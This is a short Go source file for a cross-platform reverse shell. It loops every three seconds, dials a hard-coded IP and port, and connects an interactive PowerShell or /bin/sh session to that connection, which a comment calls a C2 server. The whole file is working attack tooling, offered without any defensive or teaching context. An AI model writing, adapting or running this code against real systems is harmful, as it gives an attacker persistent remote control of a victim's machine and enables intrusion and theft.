package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

const SERVER string = "172.16.161.129"
const PORT string = "8443"

func main() {
	fmt.Println("Simple Go Reverse Shell")
	connStr := SERVER + ":" + PORT
	for {
		time.Sleep(3 * time.Second)
		sendShell(connStr)
	}
}

// sends a shell to a remote server
func sendShell(connectString string) {
	con, err := net.Dial("tcp", connectString)
	if err != nil {
		return
	}

	//spawn shell for correct OS
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	//send shell's standard in/out/err to C2 server
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}

